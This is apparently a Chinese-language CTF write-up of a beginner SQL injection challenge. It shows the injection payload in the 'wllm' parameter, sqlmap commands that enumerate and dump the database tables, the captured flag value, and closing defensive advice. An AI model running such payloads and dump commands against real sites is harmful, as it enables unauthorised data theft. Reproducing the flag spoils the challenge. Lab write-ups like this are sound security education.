# CTF Writeup - SQL注入漏洞获取Flag

## 题目信息
- **目标URL**: http://node4.anna.nssctf.cn:29020/
- **题目类型**: Web安全 - SQL注入漏洞
- **技术栈**: PHP 5.6.40, Nginx 1.14.2, MySQL/MariaDB

## 发现过程

### 1. 信息收集
通过访问目标URL，发现页面提示"球球你输入点东西吧！"和标题"参数是 wllm"，表明可能存在GET参数`wllm`。

### 2. 注入点确认
测试`wllm`参数：
- `/?wllm=' or '1'='1` 返回了数据库查询结果：`Your Login name:xxx<br>Your Password:yyy`
- 确认存在SQL注入漏洞，类型为布尔盲注

### 3. 数据库枚举
使用sqlmap进行系统化利用：

```bash
# 探测注入点
sqlmap -u "http://node4.anna.nssctf.cn:29020/?wllm=test" --batch

# 发现数据库：test_db 最可疑
sqlmap -u "http://node4.anna.nssctf.cn:29020/?wllm=test" --batch --dbs
```

发现5个数据库，其中 `test_db` 是目标数据库。

### 4. 表结构分析
查询test_db的表结构：

```bash
sqlmap -u "http://node4.anna.nssctf.cn:29020/?wllm=test" --batch -D test_db --tables
```

发现两个表：
- `users`
- `test_tb`

### 5. 数据提取
#### users表
```bash
sqlmap -u "http://node4.anna.nssctf.cn:29020/?wllm=test" --batch -D test_db -T users --dump
```
表结构：id(int), username(varchar), password(varchar)
数据：只有一条记录 `(1, 'xxx', 'yyy')`

#### test_tb表
```bash
sqlmap -u "http://node4.anna.nssctf.cn:29020/?wllm=test" --batch -D test_db -T test_tb --dump
```
表结构：id(int), flag(varchar)
数据：包含flag的字段

## Flag获取
在test_tb表中成功获取flag：

```sql
SELECT flag FROM test_tb;
```
得到Flag：`NSSCTF{53d6562c-e442-4c99-9171-fbf9f79a6142}`

## 技术要点
1. **注入类型**：布尔盲注 + 联合查询
2. **数据库**：MySQL/MariaDB
3. **注入点**：GET参数`wllm`
4. **利用工具**：sqlmap
5. **关键发现**：
   - 使用布尔判断确定注入点
   - 逐步数据库枚举策略
   - 敏感表名`test_tb`包含flag字段

## 防护建议
1. 使用参数化查询或预编译语句
2. 对用户输入进行严格过滤和转义
3. 最小权限原则：数据库账户不应有高权限
4. 错误信息不应泄露数据库结构

## 总结
该题目是一个典型的SQL注入漏洞，通过简单的参数测试发现注入点，使用自动化工具完成数据库枚举和数据提取。题目难度适中，适合Web安全入门学习。
